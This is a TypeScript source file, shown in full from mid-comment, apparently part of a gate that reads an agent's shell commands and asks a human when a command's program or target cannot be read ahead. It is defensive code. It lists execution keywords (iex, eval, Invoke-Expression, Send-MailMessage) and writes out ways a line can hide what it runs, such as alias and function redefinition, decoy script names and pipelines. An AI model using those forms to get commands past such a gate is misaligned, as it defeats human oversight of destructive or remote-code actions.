 * written with a path (`./start`, `C:\x\start.exe`), they name that file
 * (review of PR #682, pass 4). A path to a real program that runs another
 * (`/usr/bin/sudo`, `C:\Windows\System32\cmd.exe`) is still that program.
 */
const SHELL_KEYWORDS = new Set([
  'start',
  'call',
  'for',
  'doskey',
  'do',
  'then',
  'else',
  'elif',
  'if',
  'while',
  'until',
  '!',
  'eval',
  'exec',
  'command',
  'source',
  'iex',
  'invoke-expression',
  'start-process',
  'saps',
  'ii',
  'invoke-item',
  'out-printer',
  'send-mailmessage',
]);

/**
 * A program word the text does not name: it comes from a variable (`$c`,
 * `%X%`, `!X!`) or a substitution (`` `…` ``, `$(…)`, `lpr$(echo)`, PowerShell's
 * `& (…)`). Like a download target decided when the command runs (#614), it
 * cannot be read ahead (review of PR #682, pass 4).
 */
function isDecidedAtRunTime(word: string): boolean {
  // `$x`, backticks; cmd's `%X%`, `%f`, `%%f`, `%~dpnxf`, `%1`…`%9`, `%*`,
  // `%~1`, `%~dp0`, and delayed `!X!` (review of PR #682, pass 5).
  return /[$`]|%%?(~[a-z]*)?[a-z0-9*]|![^!\s]+!/i.test(word);
}

/**
 * True when a unit gives a command name a meaning held in text the reading
 * does not read as a command: an alias (`alias npm='npm install'`, fish's
 * `alias npm 'npm install'`, bash's `BASH_ALIASES[x]=`, zsh's `aliases[x]=`
 * and `functions[x]=`), `hash -p FILE name`, a doskey macro, PowerShell's
 * `Set-Alias` / `New-Alias` / `Import-Alias` and a write to its `alias:` or
 * `function:` drive (`Set-Item function:npm '…'`, `$function:npm = '…'`).
 * Every later word of the line may then run it, so the program those words
 * name is not the one written (Codex, PR #710 pass 4). A function written
 * with its body (`f() { …; }`, `function f { … }`) is not one: its body is
 * read as commands where it stands.
 *
 * PowerShell reaches those two stores by their drive (`alias:`), by their
 * provider written out (`Alias::`, `Microsoft.PowerShell.Core\Alias::`), after
 * a parameter's colon (`-Path:alias:zz`), and through a drive of any name made
 * over the provider (`New-PSDrive q Alias ''`). Each form is read (pass 5).
 */
function redefinesCommand(unit: readonly string[]): boolean {
  const [program = '', ...args] = unit;
  if (unit.some((word) => /(^|[:\\/])(function|alias):/i.test(word))) return true;
  if (/^(bash_aliases|aliases|galiases|saliases|functions)\[/.test(program)) return true;
  switch (program) {
    case 'new-psdrive':
    case 'ndr':
    case 'mount':
      return args.some((a) =>
        /^(-psprovider:)?(microsoft\.powershell\.core\\)?(function|alias)$/i.test(a),
      );
    case 'alias':
      return args.some((a) => !a.startsWith('-'));
    case 'hash':
      return args.includes('-p');
    case 'doskey':
      return args.some((a) => a.includes('='));
    case 'set-alias':
    case 'sal':
    case 'new-alias':
    case 'nal':
    case 'import-alias':
    case 'ipal':
      return true;
    default:
      return false;
  }
}

/**
 * True when a command line runs a program the text does not name: one decided
 * at run time, or a name the line redefines (`redefinesCommand`). The gate
 * asks for it even when inline code is allowed, as an allowed download asks
 * when its target is decided at run time.
 */
export function programDecidedAtRunTime(
  cmd: string,
  host?: ShellHost,
  reader?: ScriptShell,
): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  return commandUnits(cmd, 0, reader ?? topShell(host)).some(
    (u) => isDecidedAtRunTime(u[0] ?? '') || redefinesCommand(u),
  );
}

/**
 * What each kind of action acts on, as the text says it (#715). The owner's
 * rule (12/10): an ALLOWED kind still asks when the text cannot establish
 * what it acts on, for every kind.
 * - `program`: inline code acts through the program it runs, decided at run
 *   time when no word names it (`programDecidedAtRunTime`, #667). The code
 *   written into the command is the kind itself, allowed or not.
 * - `writes`: a download acts on where it writes (`downloadWrites`). The gate
 *   judges each place against the job's workspaces (#614), which only it can
 *   see (packages/tools): one outside, or one the text does not say, asks.
 * - `words`: every other kind acts on what its words name: the files a delete
 *   removes, the packages an install fetches, the processes a kill stops,
 *   what a launcher opens (`wordsDecidedAtRunTime`).
 */
export const SHELL_KIND_TARGETS = {
  inline_code: 'program',
  delete_files: 'words',
  install_software: 'words',
  download: 'writes',
  open_or_send: 'words',
  stop_programs: 'words',
  system_settings: 'words',
} as const satisfies Record<StaticShellCategory, 'program' | 'writes' | 'words'>;

/**
 * The PowerShell commands whose parameters a pipeline may bind the reading
 * holds (#715): the provider cmdlets that delete or erase, Remove-Item's names
 * (`REMOVE_ITEM_NAMES`) and `PROVIDER_ERASERS`. Their signatures say which
 * parameters a pipeline binds (`PsParameter.pipeline`).
 */
const PIPELINE_TARGETS: ReadonlyMap<string, PsSignature> = new Map([
  ...REMOVE_ITEM_NAMES.map((name) => [name, REMOVE_ITEM] as const),
  ...Object.entries(PROVIDER_ERASERS),
]);

/**
 * True when the text gives a held command every parameter a pipeline could
 * bind (`PsParameter.pipeline`): each group by one of its names, or by its
 * position. Only then is nothing left for a pipeline, or a prompt, to fill.
 */
function givesTarget(unit: readonly string[]): boolean {
  const signature = PIPELINE_TARGETS.get(unit[0] ?? '');
  if (signature === undefined) return false;
  const bound = bindPsArguments(unit.slice(1), signature);
  const positional = psPositional(bound);
  const groups = new Map<string, boolean>();
  for (const [name, p] of Object.entries(signature.parameters)) {
    if (p.pipeline === undefined) continue;
    const given =
      psValues(bound, name).length > 0 ||
      (p.position !== undefined && positional[p.position] !== undefined);
    groups.set(p.pipeline, (groups.get(p.pipeline) ?? false) || given);
  }
  return [...groups.values()].every(Boolean);
}

/**
 * True when PowerShell binds this command's parameters as the reading holds
 * them: a held command (`PIPELINE_TARGETS`) in a line PowerShell reads
 * (`UNIT_SHELL`). Read by sh or cmd, `rm -i ./dist` is rm and its option
 * (Nodal review pass 1), and cmd runs no cmdlet (measured: `'Remove-Item' is
 * not recognized`).
 */
function readByPowerShell(unit: readonly string[]): boolean {
  return UNIT_SHELL.get(unit) === 'powershell' && PIPELINE_TARGETS.has(unit[0] ?? '');
}

/**
 * True when a PowerShell pipeline binds what it hands this command: any
 * command whose parameters the reading does not hold may take it; one it
 * holds only where the text leaves a parameter the pipeline binds empty
 * (measured, Windows PowerShell 5.1: `Get-ChildItem src | Remove-Item
 * .\x.txt` refuses each object it is handed and deletes nothing, and `|
 * Clear-Content .\x.txt` empties nothing).
 */
function pipelineBinds(unit: readonly string[]): boolean {
  return !readByPowerShell(unit) || !givesTarget(unit);
}

/**
 * A word whose value is decided when the command runs: one `readablePath`
 * cannot read. An empty word names nothing, and PowerShell's switch written
 * `-Name:$true` / `-Name:$false` holds a constant.
 */
function wordDecidedAtRunTime(word: string): boolean {
  return word !== '' && !/^[-–—―][\w-]+:\$(true|false)$/i.test(word) && readablePath(word) === null;
}

/**
 * True when what one unit acts on is decided when it runs (#715): a word of
 * it the reading cannot read, words handed to it when it runs
 * (`FED_AT_RUN_TIME`: xargs, parallel, find and fd, a PowerShell pipeline),
 * or a command PowerShell reads whose parameters a pipeline binds the text
 * leaves empty, which then come from a pipeline or a prompt. The reading does not hold each
 * program's grammar: any word it cannot read may be what the program acts on.
 */
function wordsDecidedAtRunTime(unit: readonly string[]): boolean {
  if (FED_AT_RUN_TIME.has(unit) || unit.slice(1).some(wordDecidedAtRunTime)) return true;
  return readByPowerShell(unit) && !givesTarget(unit);
}

/**
 * The kinds of action of `command` whose target its text cannot establish
 * (#715, `SHELL_KIND_TARGETS`): an allowed one still asks. A download is not
 * among them: where it writes is judged against the workspaces by the gate.
 * Read on each command the line runs, for the kinds of that command only:
 * `rm -rf ./dist && npm install $PKG` asks for the install, not the delete.
 */
export function targetsDecidedAtRunTime(
  command: string,
  host?: ShellHost,
  reader?: ScriptShell,
): StaticShellCategory[] {
  if (typeof command !== 'string' || command.trim() === '') return [];
  const found = new Set<StaticShellCategory>();
  if (programDecidedAtRunTime(command, host, reader)) found.add('inline_code');
  for (const unit of commandUnits(command, 0, reader ?? topShell(host))) {
    if (!wordsDecidedAtRunTime(unit)) continue;
    for (const kind of unitCategories(unit))
      if (SHELL_KIND_TARGETS[kind] === 'words') found.add(kind);
  }
  return [...found];
}

/** The programs whose purpose is to run another one, as `commandUnits` reads them. */
export const RUNS_ANOTHER_PROGRAMS: readonly string[] = Object.keys(RUNS_ANOTHER);

/** What `start` / `Start-Process` starts, as the words of a program (no shell). */
function launchedWords(program: string, args: readonly ShellWord[]): Payload[] {
  // `args` has no title left: `wordUnits` took it out with this same reading.
  const { target, launched } = readLaunch(args, launchForm(program));
  if (target === null) return [];
  return argv([target, ...launched].map((text) => ({ text, quoted: false })));
}

/** True when a unit's program runs another one: its own words are not the work. */
function runsAnother(unit: readonly string[]): boolean {
  const grammar = RUNS_ANOTHER[unit[0] ?? ''];
  return (
    grammar !== undefined &&
    grammar(
      unit.slice(1).map((text) => ({ text, quoted: false })),
      'exec',
    ).length > 0
  );
}

/**
 * The commands a command line actually runs, as token lists whose first token
 * is the program (its basename, lower-cased, without `.exe`): each command of
 * the line, the module of `python -m`, what `$(…)` / backticks run, and what
 * every program of `RUNS_ANOTHER` starts, the program itself kept as a unit.
 *
 * `shell` is the shell that READS the line: where a command ends, what quotes
 * and what escapes follow its grammar (review of PR #682, pass 3). A line
 * whose shell is not known (`run_command` uses cmd.exe on Windows and sh
 * elsewhere, `topShell`) is read as both, and every command either would run
 * is kept: a net may over-ask, never under-report.
 *
 * `processes` is the shell whose processes the line runs in, when it is not
 * the one whose grammar splits it (`downloadWrites`): which commands run in
 * the line's own process, and so move its folder (#717, `lineFolders`).
 */
export function commandUnits(
  command: string,
  depth = 0,
  shell?: LineShell,
  processes?: LineShell,
): string[][] {
  const cmd = command;
  if (shell === undefined) {
    // A command both shells run is kept once. Where they read its folder move
    // differently (`(cd x)`: a subshell in sh, a block in cmd; `x.bat`: a
    // batch file of cmd's own process, a program sh starts), the folder after
    // it is not known (#717).
    const kept = new Map<string, string[]>();
    const units: string[][] = [];
    for (const unit of [...commandUnits(cmd, depth, 'cmd'), ...commandUnits(cmd, depth, 'sh')]) {
      const key = JSON.stringify(unit);
      const first = kept.get(key);
      if (first === undefined) {
        kept.set(key, unit);
        units.push(unit);
      } else {
        if (folderReading(first) !== folderReading(unit)) FOLDER_UNKNOWN.add(first);
        // what one reading cannot follow, the kept unit cannot either
        if (UNFOLLOWED_UNITS.has(unit)) UNFOLLOWED_UNITS.add(first);
      }
    }
    return units;
  }
  if (typeof cmd !== 'string' || cmd.trim() === '') return [];
  // What no reading follows (Nodal review of PR #721, passes 14 and 15):
  // payloads and substitutions nested past eight levels, and the text of a
  // line past `MAX_NESTING` parentheses or braces (ten thousand levels ran
  // the readers out of stack or memory). It is `unfollowed`, which the floor
  // holds for a human under any autonomy; what stands within the limits, the
  // rest of the line, is read as any line.
  if (depth > MAX_DEPTH) return [unfollowed()];
  const within = depth === 0 ? withinNesting(cmd) : { text: cmd, cut: false };
  if (within.cut) return [unfollowed(), ...commandUnits(within.text, depth, shell, processes)];
  const model = processes ?? shell;
  const units: string[][] = [];
  // Substitutions run even inside double quotes: `$(…)` in sh and PowerShell,
  // backticks in sh (PowerShell's backtick is its escape, cmd has neither).
  if (shell !== 'cmd' && shell !== 'exec') {
    // A here-document's body is read by the scan (`scanLine`): its own
    // substitutions run only when its marker is not quoted.
    const text = shell === 'sh' ? withoutHereDocBodies(cmd) : cmd;
    for (const inner of substitutionsOf(text, shell)) {
      const read = commandUnits(inner, depth + 1, shell);
      // sh runs a substitution in a subshell; cmd has none, its text runs
      // nothing. PowerShell runs one in its own runspace, but an unquoted one
      // is read by the scan below as well: its move cannot be counted once.
      if (model === 'powershell') for (const unit of read) FOLDER_UNKNOWN.add(unit);
      else runIn(read, [newProcess()]);
      units.push(...read);
    }
  }
  for (const words of splitQuotedShellWords(cmd, shell, model)) {
    const read = wordUnits(words, depth, shell, { model });
    const redirections = COMMAND_REDIRECTIONS.get(words);
    if (redirections !== undefined)
      for (const unit of read) UNIT_REDIRECTIONS.set(unit, redirections);
    runIn(read, COMMAND_PROCESS.get(words) ?? []);
    if (COMMAND_MAY_NOT_RUN.has(words)) for (const unit of read) MAY_NOT_RUN.add(unit);
    if (COMMAND_PIPED.has(words))
      for (const unit of read) if (pipelineBinds(unit)) FED_AT_RUN_TIME.add(unit);
    chainIn(read, COMMAND_CHAIN.get(words) ?? []);
    units.push(...read);
  }
  return units;
}

/** The program word of each unit as written (`./build.sh`), for `commandUnitsAsWritten`. */
const UNIT_HEADS = new WeakMap<readonly string[], string>();

/** A redirection of a command: what it opens, as the shell reads its target. */
interface Redirection {
  /** `>`, `>>`, `&>`, `<>`…: the target is written; `<`: it is read. */
  write: boolean;
  path: string;
}

/**
 * The redirections of each command a scanner reads (`scanLine`,
 * `cmdCommands`), taken out of its words; then of each unit read from that
 * command, which share them (`sudo curl URL > f`, `bash -c "curl URL" > f`:
 * what the units write lands there).
 */
const COMMAND_REDIRECTIONS = new WeakMap<readonly ShellWord[], readonly Redirection[]>();
const UNIT_REDIRECTIONS = new WeakMap<readonly string[], readonly Redirection[]>();

/** The units read as the program a script is named after (`npm.cmd` → npm), for `folderMoveOf`. */
const NAMED_AFTER_UNITS = new WeakSet<readonly string[]>();

/**
 * The processes a unit runs in below the line's own one, outermost first
 * (#717); none for a command of the line's own shell process. Each number is
 * one process: a `( … )` subshell of sh, a side of a pipe, what `bash -c` or
 * `sudo` starts… A folder a command moves into stays in its process: it
 * reaches the commands after it there, never one outside (`lineFolders`).
 */
const UNIT_PROCESS = new WeakMap<readonly string[], readonly number[]>();

let processCount = 0;
/** A process no other has been given: only ever compared with another for equality. */
const newProcess = (): number => ++processCount;

/** Every unit of `units` runs inside `processes`, around the ones it already runs in. */
function runIn(units: ReadonlyArray<readonly string[]>, processes: readonly number[]): void {
  if (processes.length === 0) return;
  for (const unit of units)
    UNIT_PROCESS.set(unit, [...processes, ...(UNIT_PROCESS.get(unit) ?? [])]);
}

/**
 * The units that run a script in the process of the shell that reads them
 * (`runsInItsShell`): where the script's body ends is the folder of what comes
 * after it there, which only that body says (#717).
 */
const IN_PROCESS_SCRIPTS = new WeakSet<readonly string[]>();

/**
 * The units whose folder move the reading cannot tell: a line whose shell is
 * not known, read as both, where they disagree; a PowerShell subexpression,
 * read twice; what a program runs whose process depends on which shell the
 * host has (`source`, `RUNS_IN_PROCESS`) (#717). A folder they would move
 * into is unknown (null).
 */
const FOLDER_UNKNOWN = new WeakSet<readonly string[]>();

/**
 * The units that may not run whenever the line reaches them (Nodal review of
 * PR #721, P1): on the right of `&&` / `||`, in the body of an `if`, a loop,
 * a `case`, a function (`Processes`), in what cmd's `if` and `for` run
 * (`RUNS_IN_PROCESS`). A folder they would move into may not be the one the
 * line goes on in: unknown (null) from there.
 */
const MAY_NOT_RUN = new WeakSet<readonly string[]>();

/**
 * The `&&` chains a unit is in, outermost first (Nodal review of PR #721): a
 * move that may not run is still made for what follows it in its own chain,
 * which runs only if it ran (`mkdir out && cd out && make`), and leaves the
 * folder unknown past that chain (`lineFolders`).
 */
const UNIT_CHAIN = new WeakMap<readonly string[], readonly number[]>();

/** Every unit of `units` is in `chains` too, around the ones it is already in. */
function chainIn(units: ReadonlyArray<readonly string[]>, chains: readonly number[]): void {
  if (chains.length === 0) return;
  for (const unit of units) UNIT_CHAIN.set(unit, [...chains, ...(UNIT_CHAIN.get(unit) ?? [])]);
}

/**
 * The units whose program word the shell may resolve, by adding an extension,
 * to a script it runs in its own process (Nodal review of PR #721, P2), with
 * the extensions it tries, in order: cmd a bare name or a path through
 * PATHEXT's `.com .exe .bat .cmd`, a file of the folder first; PowerShell a
 * path (`.\env`) to its `.ps1`. Only the gate can look (`{ script, extensions }`):
 * a batch file or a `.ps1` found is that script, anything else is a program.
 */
const MAY_BE_SCRIPT = new WeakMap<readonly string[], readonly string[]>();

/**
 * The units handed words the text does not hold, when they run (#715): what
 * xargs appends, what find puts in place of `{}`, what a PowerShell pipeline
 * binds to the command on its right. What such a command acts on is decided
 * when it runs (`targetsDecidedAtRunTime`).
 */
const FED_AT_RUN_TIME = new WeakSet<readonly string[]>();

/** The shell that reads each unit's words, as `wordUnits` read them (#715: whose parameters bind). */
const UNIT_SHELL = new WeakMap<readonly string[], LineShell>();

/** The programs of `RUNS_ANOTHER` that hand what they run words of their own (`FED_AT_RUN_TIME`). */
const HANDS_WORDS: ReadonlySet<string> = new Set([
  // `xargs rm`, `xargs -I{} rm {}`, `parallel rm`: the words they read.
  'xargs',
  'parallel',
  // `fd -x rm`, `fd -X rm`: each file found, or all of them.
  'fd',
  'fdfind',
  // `find … -exec rm {} +`: what it runs, once per file found, gets that file
  // in place of `{}` (glued too: `x{}y`, measured). sh's scanner reads `{`
  // and `}` as its own operators, so the `{}` is not always among the words
  // read: every command find runs is handed them.
  'find',
]);

/** cmd's own commands: never a file of the folder, whatever is there. */
const CMD_INTERNAL = new Set([
  'assoc',
  'break',
  'call',
  'cd',
  'chdir',
  'cls',
  'color',
  'copy',
  'date',
  'del',
  'dir',
  'dpath',
  'echo',
  'endlocal',
  'erase',
  'exit',
  'for',
  'ftype',
  'goto',
  'if',
  'keys',
  'md',
  'mkdir',
  'mklink',
  'move',
  'path',
  'pause',
  'popd',
  'prompt',
  'pushd',
  'rd',
  'rem',
  'ren',
  'rename',
  'rmdir',
  'set',
  'setlocal',
  'shift',
  'start',
  'time',
  'title',
  'type',
  'ver',
  'verify',
  'vol',
  'do',
  'else',
]);

/** Windows' reserved device names, which no file of any folder can take (`nul.bat`). */
const WINDOWS_DEVICE = /^(con|prn|aux|nul|com[1-9]|lpt[1-9])$/i;

/** The extensions `model` tries after a program word that has none (`MAY_BE_SCRIPT`). */
function scriptExtensions(model: LineShell, word: string): readonly string[] | null {
  // PowerShell's `&` and `.` read for another shell's line name no file, and
  // a Windows device (`nul`, `con`, `com1`…) is no file of any folder: no
  // `nul.bat` can be there.
  if (!/\w/.test(word) || isDecidedAtRunTime(word) || /\.[^.\\/]+$/.test(word)) return null;
  if (WINDOWS_DEVICE.test(word.split(/[\\/]/).pop() ?? '')) return null;
  const path = /[\\/]/.test(word);
  switch (model) {
    case 'cmd':
      return path || !CMD_INTERNAL.has(word.toLowerCase())
        ? ['.com', '.exe', '.bat', '.cmd']
        : null;
    case 'powershell':
      return path ? ['.ps1'] : null;
    default:
      return null;
  }
}

/**
 * True when the shell `model` runs the file a command names in its own process
 * (#717): cmd a batch file, run directly or with `call`; PowerShell a `.ps1`,
 * run directly, with `&` or dot-sourced (a script's location is the
 * runspace's); sh only what `.` and `source` read, a script run directly
 * being a process of its own. A program the text does not name may be such a
 * file: cmd's `%S%`, PowerShell's `& $s`.
 */
function runsInItsShell(
  model: LineShell,
  word: string,
  invoked: boolean,
  sourced: boolean,
): boolean {
  switch (model) {
    case 'sh':
      return sourced;
    case 'cmd':
      return /\.(bat|cmd)$/i.test(word) || isDecidedAtRunTime(word);
    case 'powershell':
      return /\.ps1$/i.test(word) || (invoked && isDecidedAtRunTime(word));
    case 'exec':
      return false;
  }
}

/** One command a line runs, as `commandUnits` reads it and as it was written. */
export interface CommandUnit {
  /** The program (basename, lower-cased, without `.exe`), then its arguments. */
  unit: string[];
  /**
   * The program word as written (`./build.sh`, `scripts/run.bat`): where a
   * script run directly lives (#635). For the module of `python -m`, the module.
   */
  head: string;
}

/**
 * The shell a script is written for, when the text read is a script's (#635):
 * its lines are read with that shell's grammar, whatever the host.
 */
export type ScriptShell = 'sh' | 'cmd' | 'powershell';

/** `commandUnits` of a line, each unit with its program word as written. */
export function commandUnitsAsWritten(
  cmd: string,
  host?: ShellHost,
  reader?: ScriptShell,
): CommandUnit[] {
  return commandUnits(cmd, 0, reader ?? topShell(host)).map((unit) => ({
    unit,
    head: UNIT_HEADS.get(unit) ?? unit[0] ?? '',
  }));
}

/**
 * How a command moves the folder the commands after it run from (#717):
 * - a folder, as written; null when the text does not say which;
 * - `{ script }`: the folder a script run in that process ends in, which only
 *   its body says (the gate reads it, packages/tools); with `extensions`, a
 *   word the shell may resolve to such a script by adding one of them, in
 *   order (`MAY_BE_SCRIPT`): the gate looks, and anything else it finds, or
 *   nothing, is a program that moves nothing;
 * - `{ save }` / `{ restore }`: the folder is kept, then the one kept comes
 *   back: around the moves of a child process, and cmd's `setlocal` /
 *   `endlocal` in a batch file, whose end restores every one it kept.
 */
export type FolderMove =
  | string
  | null
  | { readonly script: string; readonly extensions?: readonly string[] }
  | { readonly save: true }
  | { readonly restore: true }
  /**
   * The end of the `&&` chain after the move at this index, which runs only
   * if that move was made. Past it, the move may not have been: a `cd` into a
   * folder that is not there when it runs fails (#723), a move that may not
   * run may not have. The line is in the folder it was in before the move or
   * in the one it entered (the gate keeps both, packages/tools).
   */
  | { readonly unsure: number };

/**
 * How one unit moves the folder of the process it runs in: a `cd`-like
 * command, a script run in that process, and in a batch file cmd's `setlocal`
 * and `endlocal` (on a command line they do nothing). A unit read as the
 * program a script is named after (`cd.bat decoy`) is a guess: it may add a
 * kind, never move a folder (Codex, PR #710 pass 8). A move the reading
 * cannot tell is to a folder not known; one that may not run, `lineFolders`.
 */
function folderMoveOf(unit: readonly string[], batch: boolean): FolderMove | undefined {
  if (NAMED_AFTER_UNITS.has(unit)) return undefined;
  const program = unit[0] ?? '';
  const extensions = MAY_BE_SCRIPT.get(unit);
  let move: FolderMove | undefined;
  if (IN_PROCESS_SCRIPTS.has(unit)) {
    const path = readablePath(UNIT_HEADS.get(unit) ?? program);
    move = path === null ? null : { script: path };
  } else if (extensions !== undefined) {
    // Only a script found moves the folder: one that may not run is told to
    // the gate, which knows whether it found one (a program moves nothing).
    const path = readablePath(UNIT_HEADS.get(unit) ?? program);
    move = path === null || FOLDER_UNKNOWN.has(unit) ? null : { script: path, extensions };
  } else if (batch && program === 'setlocal') move = { save: true };
  else if (batch && program === 'endlocal') move = { restore: true };
  else if (CHANGE_DIR.has(program)) {
    const dir = changeDirArg(program, unit.slice(1));
    move = dir === null ? null : readablePath(dir);
  }
  return move !== undefined && FOLDER_UNKNOWN.has(unit) ? null : move;
}

/** How a unit moves its own process's folder, and whether that process is the line's. */
function folderReading(unit: readonly string[]): string {
  return JSON.stringify([
    (UNIT_PROCESS.get(unit) ?? []).length > 0,
    MAY_NOT_RUN.has(unit),
    folderMoveOf(unit, false) ?? 'none',
  ]);
}

/** One unit of a line, as `lineFolders` reads it. */
export interface FolderStep {
  /** The moves before the unit runs: leaving the processes it is not in, keeping a folder it will change. */
  before: FolderMove[];
  /** How the unit itself moves the folder of its process, if it does. */
  move: FolderMove | undefined;
}

/**
 * How a line moves the folder its commands run from, unit by unit, in order
 * (#717): THE reading of a folder change, for the sources a line runs
 * (program-sources.ts) and for where its downloads land (`downloadWrites`).
 * Only a command of the line's own shell process moves the line: one a child
 * process runs (`cmd /c`, `bash -c`, `( … )` in sh, a side of a pipe…) moves
 * that child, for its own later commands, and the move is undone where the
 * child ends (`{ save }` … `{ restore }`). A script run in the line's process
 * leaves it where the script ends (`{ script }`). A move that may not run
 * (`MAY_NOT_RUN`) is made for what follows it in its own `&&` chain, which
 * runs only if it ran; so is any `cd`, which fails into a folder that is not
 * there when it runs (#723). Past that chain, the line is in the folder before
 * the move or in the one it entered (`{ unsure }`). `batch`: the line is one
 * of a batch file, where `setlocal` and `endlocal` keep and restore the
 * folder.
 */
export function lineFolders(batch: boolean): {
  step(unit: readonly string[]): FolderStep;
  /** Leaving every child process still open, at the end of the line. */
  end(): FolderMove[];
} {
  // The child processes the reading is in, outermost first: whether a folder
  // was kept on entering it, which only a move inside it needs.
  const open: Array<{ process: number; kept: boolean }> = [];
  const leave = (depth: number, out: FolderMove[]): void => {
    while (open.length > depth) if (open.pop()?.kept === true) out.push({ restore: true });
  };
  // The moves that may not have run (Nodal review of PR #721): where each
  // stands in the list, and the `&&` chain past which it is unsure.
  const unsure: Array<{ chain: number | undefined; at: number }> = [];
  const settle = (chains: readonly number[] | null, out: FolderMove[]): void => {
    for (let i = unsure.length - 1; i >= 0; i--) {
      const move = unsure[i];
      if (move === undefined) continue;
      if (chains !== null && move.chain !== undefined && chains.includes(move.chain)) continue;
      out.push({ unsure: move.at });
      unsure.splice(i, 1);
    }
  };
  // How many moves the list holds so far: the consumers push every one.
  let count = 0;
  return {
    step(unit) {
      const path = UNIT_PROCESS.get(unit) ?? [];
      const chains = UNIT_CHAIN.get(unit) ?? [];
      const before: FolderMove[] = [];
      // Past the chain of a move that may not have run, the folder is not
      // known (before leaving a child: its own moves are undone after).
      settle(chains, before);
      let shared = 0;
      while (shared < open.length && open[shared]?.process === path[shared]) shared += 1;
      leave(shared, before);
      for (const process of path.slice(shared)) open.push({ process, kept: false });
      let move = folderMoveOf(unit, batch && path.length === 0);
      const mayNotRun = move !== undefined && move !== null && MAY_NOT_RUN.has(unit);
      // A folder kept that may not have been leaves nothing to restore to.
      if (mayNotRun && typeof move === 'object' && move !== null && !('script' in move))
        move = null;
      if (move !== undefined)
        for (const level of open)
          if (!level.kept) {
            level.kept = true;
            before.push({ save: true });
          }
      count += before.length;
      if (move !== undefined) {
        // A move that may not run, and a `cd` that may fail (#723): made
        // for its own chain, either folder past it.
        if (move !== null && (mayNotRun || typeof move === 'string'))
          unsure.push({ chain: chains.at(-1), at: count });
        count += 1;
      }
      return { before, move };
    },
    end() {
      const out: FolderMove[] = [];
      settle(null, out);
      leave(0, out);
      count += out.length;
      return out;
    },
  };
}

/** A shell's `-c LINE` (`sh -c`, `bash -lc`): the line is read as commands, not a script file. */
export function shellRunsLine(args: readonly string[]): boolean {
  return shellLine(args.map((text) => ({ text, quoted: false }))).length > 0;
}

/** The shell that reads a `run_command` line on this host; unknown → both (`commandUnits`). */
function topShell(host: ShellHost | undefined): LineShell | undefined {
  return host === undefined ? undefined : host === 'windows' ? 'cmd' : 'sh';
}

/**
 * The units of one command, given as its words. `invoked`: run by PowerShell's
 * `&` or `.`; `sourced`: a file the shell reads itself (`Payload`); `model`:
 * the shell whose process runs it, when not `shell` (`commandUnits`).
 */
function wordUnits(
  words: readonly ShellWord[],
  depth: number,
  shell: LineShell,
  how: { invoked?: boolean; sourced?: boolean; model?: LineShell } = {},
): string[][] {
  if (depth > MAX_DEPTH) return [unfollowed()];
  const invoked = how.invoked === true;
  const model = how.model ?? shell;
  // `FOO=1 rm -rf build`: variables set for the command are not the program
  // (review of PR #476).
  let k = 0;
  while (k < words.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[k]?.text ?? '')) k += 1;
  const head = words[k];
  if (head === undefined) return [];
  // In PowerShell a statement that starts with `$` is an expression, not a
  // command: it runs a program only through `&` or `.` (`invoked`). Its
  // assignment runs what its right side names when that is a command
  // (`$r = Invoke-RestMethod x`), never a string or a value (`$c = 'lpr'`).
  if (shell === 'powershell' && !invoked && head.text.startsWith('$')) {
    const tail =
      head.tail ??
      words
        .slice(k)
        .map((w) => w.text)
        .join(' ');
    const eq = tail.indexOf('=');
    const right = eq < 0 ? '' : tail.slice(eq + 1).trim();
    const units =
      eq < 0 || /^[$'"(@\[\d-]/.test(right) || right === ''
        ? []
        : commandUnits(right, depth + 1, 'powershell', model);
    // `$function:npm = '…'` writes the function: drive (`redefinesCommand`).
    const drive = /^\$((?:function|alias):[^=]*)/i.exec(head.text)?.[1];
    return drive === undefined ? units : [[drive.toLowerCase()], ...units];
  }
  // A program the text does not name (#667, review of PR #682, pass 4) keeps
  // its words, so it is never taken for a program it may not be; one written
  // with a path is that file, never the shell's keyword of the same name. An
  // array element assigned (`BASH_ALIASES[ls]=/bin/rm`) is no program either.
  const named =
    isDecidedAtRunTime(head.text) ||
    /^[A-Za-z_]\w*\[[^\]]*\]=/.test(head.text) ||
    (/[\\/]/.test(head.text) && SHELL_KEYWORDS.has(interpreterBasename(head.text)))
      ? head.text.toLowerCase()
      : interpreterBasename(head.text);
  // In a PowerShell line `start` is Start-Process's alias, never cmd's start:
  // named so, its words are read in PowerShell's form (`readLaunch`).
  const program = shell === 'powershell' && named === 'start' ? 'start-process' : named;
  // cmd's `start ["title"] …`: the title is no program and no argument of it,
  // read by THE reading of start (`readLaunch`), never by a walk of its own.
  const after = words.slice(k + 1);
  const title = program === 'start' ? readLaunch(after, 'cmd', true).titleIndex : null;
  const args = title === null ? after : after.filter((_, j) => j !== title);
  const texts = args.map((a) => a.text);
  const units: string[][] = [[program, ...texts]];
  UNIT_HEADS.set(units[0] as string[], head.text);
  UNIT_SHELL.set(units[0] as string[], shell);
  if (runsInItsShell(model, head.text, invoked, how.sourced === true))
    IN_PROCESS_SCRIPTS.add(units[0] as string[]);
  else {
    const extensions = scriptExtensions(model, head.text);
    if (extensions !== null) MAY_BE_SCRIPT.set(units[0] as string[], extensions);
  }
  // `npm.cmd install x`: the script, whose file is read where it lives (the
  // unit above), and the program it is named after, read as that program. A
  // file is never the shell's keyword of its name (`start.bat`, as above).
  const stem = program.replace(SCRIPT_RUN_BY_NAME, '');
  const namedAfter = stem !== program && stem !== '' && !SHELL_KEYWORDS.has(stem) ? stem : null;
  if (namedAfter !== null) {
    const unit = [namedAfter, ...texts];
    UNIT_HEADS.set(unit, namedAfter);
    NAMED_AFTER_UNITS.add(unit);
    units.push(unit);
  }
  for (const name of namedAfter === null ? [program] : [program, namedAfter]) {
    // What the guess reads is a guess too (`cmd.cmd /c "cd x"`, pass 9).
    const from = units.length;
    // `python -m pip install x` runs pip: the module is the program (review of
    // PR #476; main caught it by reading the whole text).
    if (interpreterKind(name) === 'python') {
      const m = texts.map((t) => t.toLowerCase()).indexOf('-m');
      const module = m >= 0 ? texts[m + 1] : undefined;
      if (module !== undefined) {
        const unit = [module.toLowerCase(), ...texts.slice(m + 2)];
        UNIT_HEADS.set(unit, module);
        // The module runs in python's process (#717).
        runIn([unit], [newProcess()]);
        units.push(unit);
      }
    }
    // What a program of the shell's own runs stays in its process; any other
    // program starts one, where what it runs moves no folder of the line. One
    // whose process depends on which shell the host has moves it to a folder
    // not known; one that runs it only when a condition holds, too, if it
